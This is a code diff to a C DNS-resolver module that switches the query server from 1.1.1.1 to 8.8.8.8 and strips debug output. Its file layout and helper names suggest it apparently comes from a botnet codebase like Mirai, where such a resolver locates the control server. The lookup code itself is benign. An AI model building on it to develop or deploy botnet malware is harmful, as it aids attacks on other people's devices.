@@ -1,8 +1,6 @@
 #define _GNU_SOURCE
 
-#ifdef DEBUG
 #include <stdio.h>
-#endif
 #include <stdint.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -18,7 +16,6 @@
 #include "rand.h"
 #include "protocol.h"
 
-#define MSG_NOSIGNAL 0
 
 void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
 {
@@ -83,8 +80,8 @@ struct resolv_entries *resolv_lookup(char *domain)
 
     util_zero(&addr, sizeof (struct sockaddr_in));
     addr.sin_family = AF_INET;
-    // addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
-    addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
+    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
+    // addr.sin_addr.s_addr = INET_ADDR(1,1,1,1);
     addr.sin_port = htons(53);
 
     // Set up the dns query
@@ -130,24 +127,20 @@ struct resolv_entries *resolv_lookup(char *domain)
 
         timeo.tv_sec = 5;
         timeo.tv_usec = 0;
-        dprintf(2, "------ 1 domain = %s \n", domain);
         nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);
 
         if (nfds == -1)
         {
-            dprintf(2, "------ 2 \n");
             printf("[resolv] select() failed\n");
             break;
         }
         else if (nfds == 0)
         {
-            dprintf(2, "------ 3 \n");
             printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
             continue;
         }
         else if (FD_ISSET(fd, &fdset))
         {
-            dprintf(2, "------ 4 \n");
             printf("[resolv] Got response from select\n");
             int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
             char *name;
